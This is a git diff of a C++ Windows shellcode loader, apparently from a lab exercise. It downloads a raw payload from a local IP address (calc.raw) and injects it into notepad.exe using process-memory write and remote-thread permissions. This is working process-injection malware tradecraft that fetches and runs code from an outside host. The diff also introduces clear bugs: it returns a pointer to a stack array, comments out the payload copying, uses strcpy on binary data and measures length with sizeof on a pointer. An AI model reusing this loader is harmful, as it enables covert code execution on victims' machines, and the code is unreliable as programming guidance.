@@ -41,15 +41,16 @@ int walk(const char* processName) {
 }
 
 // Given a URL, download and return data
-string download(const char* payloadUrl) {
+unsigned char* download(const char* payloadUrl) {
 	IStream* stream;
 
 	if (URLOpenBlockingStreamA(0, payloadUrl, &stream, 0, 0)) {
-		return "Failed";
+		return NULL;
 	}
 	printf("Connected to %s successfully\n", payloadUrl);
 
 	char buff[100];
+	//unsigned char* buffer[2048];
 	string payload;
 	unsigned long bytesRead;
 
@@ -58,15 +59,19 @@ string download(const char* payloadUrl) {
 		if (0U == bytesRead) {
 			break;
 		}
-		payload.append(buff, bytesRead);
+		//payload.append(buff, bytesRead);
+		//memcpy()
 	};
 
 	stream->Release();
-	return payload;
+
+	unsigned char payloadArray[2040];
+	strcpy((char*)payloadArray, payload.data());
+	return payloadArray;
 }
 
 // Inject shellcode into remote process
-int inject(HANDLE targetProc, const char* payload, unsigned int payloadLen) {
+int inject(HANDLE targetProc, unsigned char* payload, unsigned int payloadLen) {
 	LPVOID addr = NULL;
 	HANDLE threadHandle = NULL;
 	SIZE_T bytesWritten;
@@ -88,12 +93,12 @@ int inject(HANDLE targetProc, const char* payload, unsigned int payloadLen) {
 int main(void) {
 
 	// Download payload shellcode
-	const char* payloadUrl = "https://example.com";
-	string payload = download(payloadUrl);
-	printf("payload data:\n%s\n", payload.c_str());
+	const char* payloadUrl = "http://192.168.56.103/calc.raw";
+	unsigned char* payload = download(payloadUrl);
+	printf("payload data:\n%s\n", payload);
 
 	// Find explorer.exe process
-	int procID = walk("explorer.exe");
+	int procID = walk("notepad.exe");
 	printf("PID: %d\n", procID);
 
 	// Open process
@@ -104,12 +109,13 @@ int main(void) {
 	HANDLE targetProc = OpenProcess(PROCESS_CREATE_THREAD |
 		PROCESS_QUERY_INFORMATION |
 		PROCESS_VM_OPERATION |
-		PROCESS_VM_READ,
+		PROCESS_VM_READ |
+		PROCESS_VM_WRITE,
 		FALSE,
 		(DWORD)procID);
 
 	// Inject payload
-	int result = inject(targetProc, payload.c_str(), strlen(payload.c_str()));
+	int result = inject(targetProc, payload, sizeof(payload));
 
 	// Close
 	if (result == 0) {
